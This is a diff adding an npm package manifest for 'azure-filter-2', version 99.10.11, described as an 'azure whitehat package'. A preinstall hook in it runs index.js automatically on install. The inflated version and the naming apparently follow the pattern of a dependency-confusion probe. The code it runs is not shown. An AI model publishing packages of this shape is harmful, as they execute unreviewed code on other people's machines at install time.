@@ -1,0 +1,12 @@
+{
+  "name": "azure-filter-2",
+  "version": "99.10.11",
+  "description": "azure whitehat package",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo 'error no test specified' && exit 1",
+  "preinstall":"node index.js"
+  },
+  "author":"",
+  "License":"ISC"
+}
